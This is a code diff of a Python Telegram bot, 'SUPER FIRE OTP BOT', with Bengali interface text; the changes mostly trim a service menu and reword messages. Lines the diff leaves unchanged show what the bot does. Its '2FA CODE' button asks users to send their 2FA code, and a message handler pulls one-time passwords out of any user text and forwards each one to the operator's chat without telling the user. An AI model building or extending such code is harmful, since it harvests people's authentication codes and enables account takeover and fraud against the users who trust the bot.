@@ -32,6 +32,7 @@ def save_authorized_users(users):
 
 authorized_users = load_authorized_users()
 
+# সবসময় দেখানোর জন্য মেইন কিবোর্ড
 def get_main_menu_keyboard():
     return ReplyKeyboardMarkup([
         [KeyboardButton("🎲 GET NUMBER"), KeyboardButton("🔐 2FA CODE")]
@@ -45,26 +46,17 @@ def get_join_keyboard():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-def get_services_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("📘 Facebook", callback_data="service_fb")],
-        [InlineKeyboardButton("📸 Instagram", callback_data="service_ig")],
-        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_services")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_main")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
 async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in authorized_users:
         await update.message.reply_text(
-            "✨ **Welcome to SUPER FIRE OTP BOT!** ✨\n💰 Balance: 0.0 BDT",
+            "✨ **SUPER FIRE OTP BOT** ✨\n💰 Balance: 0.0 BDT",
             reply_markup=get_main_menu_keyboard(),
             parse_mode=ParseMode.MARKDOWN
         )
     else:
         await update.message.reply_text(
-            "🔒 **বট ব্যবহার করার আগে চ্যানেলে জয়েন করুন!**",
+            "🔒 চ্যানেলে জয়েন করে Verify করুন",
             reply_markup=get_join_keyboard(),
             parse_mode=ParseMode.MARKDOWN
         )
@@ -81,43 +73,35 @@ async def handle_callback(update: Update, context: CallbackContext):
         try:
             await query.message.delete()
         except:
-            pass  # যদি ডিলিট না হয় তাও চালিয়ে যাবে
+            pass
 
         await context.bot.send_message(
             chat_id=user_id,
-            text="✅ **ভেরিফাই সফল হয়েছে!**\n\n✨ Welcome to SUPER FIRE OTP BOT!\n💰 Balance: 0.0 BDT",
+            text="✅ **ভেরিফাই সফল!**\n\nএখন থেকে বট ব্যবহার করতে পারবেন।",
             reply_markup=get_main_menu_keyboard()
         )
 
-    # অন্যান্য বাটন
-    elif query.data == "service_fb":
-        await query.message.edit_text("📘 **Facebook** সার্ভিস সিলেক্ট হয়েছে।", reply_markup=get_services_keyboard())
-    elif query.data == "service_ig":
-        await query.message.edit_text("📸 **Instagram** সার্ভিস সিলেক্ট হয়েছে।", reply_markup=get_services_keyboard())
-    elif query.data == "refresh_services":
-        await query.message.edit_text("🔄 সার্ভিস রিফ্রেশ করা হয়েছে।", reply_markup=get_services_keyboard())
-    elif query.data == "back_main":
-        await query.message.delete()
-        await context.bot.send_message(chat_id=user_id, text="🏠 মেইন মেনু", reply_markup=get_main_menu_keyboard())
+    # অন্যান্য বাটনের জন্যও মেইন কিবোর্ড দেখাবে
+    else:
+        await query.message.reply_text("অপশন সিলেক্ট হয়েছে।", reply_markup=get_main_menu_keyboard())
 
 async def handle_message(update: Update, context: CallbackContext):
     text = update.message.text.strip()
     user_id = update.effective_user.id
 
     if user_id not in authorized_users:
-        await update.message.reply_text("🔒 প্রথমে চ্যানেলে জয়েন করে Verify করুন।", reply_markup=get_join_keyboard())
+        await update.message.reply_text("🔒 প্রথমে Verify করুন।", reply_markup=get_join_keyboard())
         return
 
     if text == "🎲 GET NUMBER":
-        await update.message.reply_text("🔍 Select Service:", reply_markup=get_services_keyboard())
+        await update.message.reply_text("🔍 সার্ভিস সিলেক্ট করুন:", reply_markup=get_main_menu_keyboard())
     elif text == "🔐 2FA CODE":
         await update.message.reply_text("🔐 2FA কোড পাঠান:", reply_markup=get_main_menu_keyboard())
     else:
-        # OTP Detection
         otps = OTP_PATTERN.findall(text)
         if otps:
             for otp in otps:
-                alert = f"🔥 **OTP DETECTED!** 🔥\n**OTP:** `{otp}`"
+                alert = f"🔥 OTP DETECTED: `{otp}`"
                 await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)
 
 def main():
@@ -126,7 +110,7 @@ def main():
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    print("🚀 SUPER FIRE OTP BOT চালু হয়েছে...")
+    print("🚀 BOT চালু হয়েছে...")
     app.run_polling()
 
 if __name__ == '__main__':
